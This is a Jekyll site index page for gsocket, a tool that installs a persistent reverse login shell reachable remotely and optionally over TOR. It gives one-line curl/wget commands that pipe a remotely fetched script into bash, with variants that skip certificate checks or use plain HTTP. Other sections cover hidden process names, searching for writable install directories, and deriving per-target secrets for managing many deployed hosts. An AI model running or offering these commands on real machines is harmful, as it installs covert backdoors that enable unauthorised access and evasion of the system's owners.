---
layout: default
---

<h2 align="center">Index -- Test version</h2>

<p class="panel-note2" markdown="1">Deploy a reverse login shell with a *single command* (fully automated) - and access the shell remotely - encrypted - and via TOR if you like.</p>

> _This must be the quickest way to access a system_ -- anonymous

Use either one of these two commands to _install_, _uninstall_, and _access_:

<!-- This is obviously the tabs wrapper -->
<div class="tabs-wrapper">
    <!-- And here the tabs container -->
    <div class="tabs">
        <!-- This is the first tab -->
        <div class="tab">
            <!-- "checked" means active tab -->
            <input type="radio" name="css-tabs-init" id="curl-init" class="tab-switch" checked>
            <!-- This is the tab selector -->
            <label for="curl-init" class="tab-label">Curl</label>
            <!-- This is the tab content container -->
            <div class="tab-content">
                <ul>
                    <li><p><strong>Install</strong></p>
<!--
This is how to reproduce the syntax highlighting with "rouge"
You must respect this weird placement to avoid extra rendered space
See here for more details:
https://jekyllrb.com/docs/liquid/tags/#code-snippet-highlighting
-->
{% highlight shell %}
bash -c "$(curl -fsSL gsocket.io/x)"
{% endhighlight %}
                    </li>
                    <li><p><strong>Uninstall</strong></p>
{% highlight shell %}
GS_UNDO=1 bash -c "$(curl -fsSL gsocket.io/x)"
{% endhighlight %}
                    </li>
                    <li><p><strong>Access</strong></p>
{% highlight shell %}
S="ExampleSecretChangeMe" bash -c "$(curl -fsSL gsocket.io/x)"
{% endhighlight %}
                    </li>
                </ul>
            </div>
        </div>
        <!-- This is the second tab -->
        <div class="tab">
            <input type="radio" name="css-tabs-init" id="wget-init" class="tab-switch">
            <label for="wget-init" class="tab-label">Wget</label>
            <div class="tab-content">
                <ul>
                    <li><p><strong>Install</strong></p>
{% highlight shell %}
bash -c "$(wget --no-verbose -O- gsocket.io/x)"
{% endhighlight %}
                    </li>
                </ul>
                <ul>
                    <li><p><strong>Uninstall</strong></p>
{% highlight shell %}
GS_UNDO=1 bash -c "$(wget --no-verbose -O- gsocket.io/x)"
{% endhighlight %}
                    </li>
                </ul>
                <ul>
                    <li><p><strong>Access</strong></p>
{% highlight shell %}
S="ExampleSecretChangeMe" bash -c "$(wget --no-verbose -O- gsocket.io/x)"
{% endhighlight %}
                    </li>
                </ul>
            </div>
        </div>
    </div>
</div>

<p class="panel-note2" markdown="1">This is just one of many GSOCKET examples. More on [GitHub]({{site.github.repository_url}}).</p>

{:refdef: style="text-align: center;"}
## Screenshots
{: refdef}
Deploy on a host
{:refdef: style="text-align: center;"}
![Deploy-Example](../assets/images/deploy-example.png)
{: refdef}
Log in to the host from your workstation
{:refdef: style="text-align: center;"}
![Deploy-Login](../assets/images/deploy-login.png)
{: refdef}

{:refdef: style="text-align: center;"}
## Tips & Tricks
{: refdef}

<div class="tabs-wrapper">
    <div class="tabs" style="height: 25.45rem;">
        <div class="tab">
            <input type="radio" name="css-tabs-tricks" id="curl-tricks" class="tab-switch" checked>
            <label for="curl-tricks" class="tab-label">Curl</label>
            <div class="tab-content" style="height: 23.5rem;">
                <ul>
                    <li><p><strong>Ignore SSL / Certificate warnings</strong></p>
{% highlight shell %}
bash -c "$(curl -fsSLk gsocket.io/x)"
{% endhighlight %}
                    </li>
                    <li><p><strong>Deploy with a predefined secret</strong></p>
{% highlight shell %}
X=ExampleSecretChangeMe bash -c "$(curl -fsSL gsocket.io/x)"
{% endhighlight %}
                    </li>
                    <li><p><strong>Deploy from self-extracting shell-script <a href="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/deploy-all.sh" target="_blank">deploy-all.sh</a> without fetching any packages and using good old plain HTTP</strong></p>
{% highlight shell %}
curl -fsSL http://nossl.segfault.net/deploy-all.sh && \
bash ./deploy-all.sh
{% endhighlight %}
                    </li>
                </ul>
            </div>
        </div>
        <div class="tab">
            <input type="radio" name="css-tabs-tricks" id="wget-tricks" class="tab-switch">
            <label for="wget-tricks" class="tab-label">Wget</label>
            <div class="tab-content" style="height: 23.5rem;">
                <ul>
                    <li><p><strong>Ignore SSL / Certificate warnings</strong></p>
{% highlight shell %}
bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"
{% endhighlight %}
                    </li>
                    <li><p><strong>Deploy with a predefined secret</strong></p>
{% highlight shell %}
X=ExampleSecretChangeMe bash -c "$(wget --no-verbose -O- gsocket.io/x)"
{% endhighlight %}
                    </li>
                    <li><p><strong>Deploy from self-extracting shell-script <a href="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/deploy-all.sh" target="_blank">deploy-all.sh</a> without fetching any packages and using good old plain HTTP</strong></p>
{% highlight shell %}
wget --no-hsts http://nossl.segfault.net/deploy-all.sh && \
bash ./deploy-all.sh
{% endhighlight %}
                    </li>
                </ul>
            </div>
        </div>
    </div>
</div>

Useful environment variables:  

|:---|:---|
|S=|Connect to a system (or use `gs-netcat -s <secret> -il`).|
|X=|Set a predefined secret for the installation (X like in inXstallation).|
|GS_NOINST=1|Only start but without installing (will not survive a reboot).|
|GSOCKET_ARGS=|Use additonal arguments. Most often used to force TOR in combination with S=, e.g. `GSOCKET_ARGS="-T" S=<secret> bash -c "$(curl -fsSLk gsocket.io/x)`.|
|GS_DSTDIR=|Set the installation directory. The default is to pick the most suitable automatically. Use `find . -type d -writable`. |
|GS_URL_BASE=|Use URL for static binaries. The default is https://github.com/hackerschoice/binary/raw/main/gsocket/bin/.|
|GS_OSARCH=|Force architecture. The default is to pick the most suitable automatically.
|GS_DEBUG=1|Verbose output and other debug related settings. Often used together with `GS_DEBUG=1 GS_NOSTART=1 GS_NOINST=1 bash -c "$(curl -fsSL gsocket.io/x)"`.|
|GS_HIDDEN_NAME=|Use a custom hidden process name.|
|TMPDIR=|Use a custom temporary directory. Try TMPDIR=$(pwd)|

If all fails:

Download the static binary from [https://github.com/hackerschoice/binary/tree/main/gsocket/bin](https://github.com/hackerschoice/binary/tree/main/gsocket/bin) (likely [gs-netcat_x86_64-alpine.tar.gz](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz)) and extract and start gs-netcat manually:

<div class="tabs-wrapper">
    <div class="tabs" style="height: 12.45rem;">
        <div class="tab">
            <input type="radio" name="css-tabs-manual" id="curl-manual" class="tab-switch" checked>
            <label for="curl-manual" class="tab-label">Curl</label>
            <div class="tab-content" style="height: 10.5rem; padding-left: 1.2em;">
{% highlight shell %}
curl -fsSL https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz | tar xz -C /bin gs-netcat
SECRET=$(/bin/gs-netcat -g)
GSOCKET_ARGS="-liD -s $SECRET" /bin/gs-netcat
echo "Connect with: gs-netcat -s $SECRET -i" 
{% endhighlight %}
            </div>
        </div>
        <div class="tab">
            <input type="radio" name="css-tabs-manual" id="wget-manual" class="tab-switch">
            <label for="wget-manual" class="tab-label">Wget</label>
            <div class="tab-content" style="height: 10.5rem; padding-left: 1.2em;">
{% highlight shell %}
wget --no-check-certificate -qO- https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz | tar xz -C /bin gs-netcat
SECRET=$(/bin/gs-netcat -g)
GSOCKET_ARGS="-liD -s $SECRET" /bin/gs-netcat
echo "Connect with: gs-netcat -s $SECRET -i" 
{% endhighlight %}
            </div>
        </div>
    </div>
</div>

{:refdef: style="text-align: center;"}
## Advanced Tips & Tricks
{: refdef}

Remembering many secrets from many deployments is cumbersome. It is easier to remember just one MASTER-SEED and derive the SECRET from the target's hostname. The following script generates a secure SECRET based on a single MASTER-SEED and the target's hostname.

<div class="tabs-wrapper">
    <div class="tabs" style="height: 35.45rem;">
        <div class="tab">
            <input type="radio" name="css-tabs-advanced" id="curl-advanced" class="tab-switch" checked>
            <label for="curl-advanced" class="tab-label">Curl</label>
            <div class="tab-content" style="height: 33.5rem; padding-left: 1.2em;">
{% highlight sh %}
# cut & paste this into your shell on your workstation or add to ~/.bashrc
gssec()
{
    str="$(echo "${GS_SEED:?}$1" | sha512sum | base64 | tr -d -c a-z0-9)"
    str="${str:0:22}"
    echo "DEPLOY: X=${str}"' bash -c "$(curl -fsSL gsocket.io/x)"'
    echo "ACCESS: S=${str}"' bash -c "$(curl -fsSL gsocket.io/x)"'
    echo "ACCESS: gs-netcat -s ${str} -i"
}

# Pick a STRONG master seed:
[[ -z $GS_SEED ]] && GS_SEED=MySuperStrongMasterSeed
{% endhighlight %}
{% highlight sh %}
# Generate a SECRET based on the SEED and 'alice.com'
$ gssec alice.com # You only need to know "alice.com" to connect.

# Output from above's command:
DEPLOY: X=2m1zidi1zkkmxjjj0z0jlj bash -c "$(curl -fsSL gsocket.io/x)"
ACCESS: S=2m1zidi1zkkmxjjj0z0jlj bash -c "$(curl -fsSL gsocket.io/x)"
ACCESS: gs-netcat -s 2m1zidi1zkkmxjjj0z0jlj -i
{% endhighlight %}
            </div>
        </div>
        <div class="tab">
            <input type="radio" name="css-tabs-advanced" id="wget-advanced" class="tab-switch">
            <label for="wget-advanced" class="tab-label">Wget</label>
            <div class="tab-content" style="height: 33.5rem; padding-left: 1.2em;">
{% highlight sh %}
# cut & paste this into your shell on your workstation or add to ~/.bashrc
gssec()
{
    str="$(echo "${GS_SEED:?}$1" | sha512sum | base64 | tr -d -c a-z0-9)"
    str="${str:0:22}"
    echo "DEPLOY: X=${str}"' bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"'
    echo "ACCESS: S=${str}"' bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"'
    echo "ACCESS: gs-netcat -s ${str} -i"
}

# Pick a STRONG master seed:
[[ -z $GS_SEED ]] && GS_SEED=MySuperStrongMasterSeed
{% endhighlight %}
{% highlight sh %}
# Generate a SECRET based on the SEED and 'alice.com'
$ gssec alice.com # You only need to know "alice.com" to connect.

# Output from above's command:
DEPLOY: X=2m1zidi1zkkmxjjj0z0jlj bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"
ACCESS: S=2m1zidi1zkkmxjjj0z0jlj bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"
ACCESS: gs-netcat -s 2m1zidi1zkkmxjjj0z0jlj -i
{% endhighlight %}
            </div>
        </div>
    </div>
</div>

<p class="panel-note" markdown="1">Get Involved. We are looking for volunteers to work on the website and a logo and to discuss new ideas. [Join us on telegram](https://t.me/thcorg).</p>

<!-- Adding some 'magic' over tabs ;) -->
<script>
(() => {
    const tabsSelector = 'input.tab-switch';
    const tabsDebug = false;
    document.querySelectorAll(tabsSelector).forEach((el) => {
        const id = el.id;
        const type = id.split('-')[0];
        if (tabsDebug === true) {
            console.log('[change] event listener attached on', id, '- type:', type);
        }
        el.addEventListener('change', (event) => {
            if (tabsDebug === true) {
                console.log('Change event triggered.', event);
            }
            let targetTabs = String(event.target.id).includes(type) ? type : 'undefined';
            if (tabsDebug === true) {
                console.log(`Should select other [${targetTabs}] tabs.`);
            }
            document.querySelectorAll(tabsSelector).forEach((target) => {
                if (String(target.id).includes(targetTabs) && !target.checked) {
                    target.checked = true;
                }
            });
        });
    });
})();
</script>

<!-- Adding some other 'magic' on code snippets :P -->
<!--
Todo: Add CSS tooltips
From: https://www.w3schools.com/css/css_tooltip.asp
Comment: Yes, I'm lazy and don't remind everything. Don't blame me.
Goal: Keep things as light as possible.
-->
<style>
figure.highlight .copy-button {
    -webkit-transition: opacity .2s ease-in-out;
    -moz-transition: opacity .2s ease-in-out;
    -o-transition: opacity .2s ease-in-out;
    transition: opacity .2s ease-in-out;
    opacity: 0;
    padding: 2px 6px;
    position: absolute;
    right: 7px;
    /* top: 4px; */
    margin-top: -3px;
}
figure.highlight:hover .copy-button {
    opacity: 1;
}
</style>
<script>
(() => {
    // Copy icon from GitHub Primer
    // https://primer.style/design/foundations/icons

    /* const copyIcon16 = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path></svg>';
    const copyIcon24 = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path d="M7.024 3.75c0-.966.784-1.75 1.75-1.75H20.25c.966 0 1.75.784 1.75 1.75v11.498a1.75 1.75 0 0 1-1.75 1.75H8.774a1.75 1.75 0 0 1-1.75-1.75Zm1.75-.25a.25.25 0 0 0-.25.25v11.498c0 .139.112.25.25.25H20.25a.25.25 0 0 0 .25-.25V3.75a.25.25 0 0 0-.25-.25Z"></path><path d="M1.995 10.749a1.75 1.75 0 0 1 1.75-1.751H5.25a.75.75 0 1 1 0 1.5H3.745a.25.25 0 0 0-.25.25L3.5 20.25c0 .138.111.25.25.25h9.5a.25.25 0 0 0 .25-.25v-1.51a.75.75 0 1 1 1.5 0v1.51A1.75 1.75 0 0 1 13.25 22h-9.5A1.75 1.75 0 0 1 2 20.25l-.005-9.501Z"></path></svg>';
    const copyIconEncoded = `data:image/svg+xml;base64,${btoa(copyIcon16)}`; */

    const snippets = document.querySelectorAll('figure.highlight pre');
    snippets.forEach((snippet) => {
        console.log('Connected on element:', snippet);
        snippet.firstChild.insertAdjacentHTML(
            'beforebegin',
            // '<button class="copy-button" data-clipboard-snippet><img width="16" src="' + copyIconEncoded + '" alt="Copy to clipboard" title="Copy to clipboard"></button>'
            '<button class="copy-button" data-clipboard-snippet><img width="16" src="/assets/icons/copy_16.svg" alt="Copy to clipboard" title="Copy to clipboard"></button>'
        );
    });
    
    const clipboardSnippets = new ClipboardJS('[data-clipboard-snippet]', {
        target: (trigger) => {
            return trigger.nextElementSibling; // 'nextElementSibling' is used because the button is placed before the other elements
        }
    });
    
    clipboardSnippets.on('success', function(e){
        e.clearSelection();
        console.log('Received [success] event.', e);
        console.log('Action:', e.action);
        console.log('Text:', e.text);
        console.log('Trigger:', e.trigger);
        // showTooltip(e.trigger,'Copied!');
    });

    clipboardSnippets.on('error', function(e){
        console.log('Received [error] event.', e);
        console.error('Action:', e.action);
        console.error('Trigger:', e.trigger);
        // showTooltip(e.trigger,fallbackMessage(e.action));
    });
})();
</script>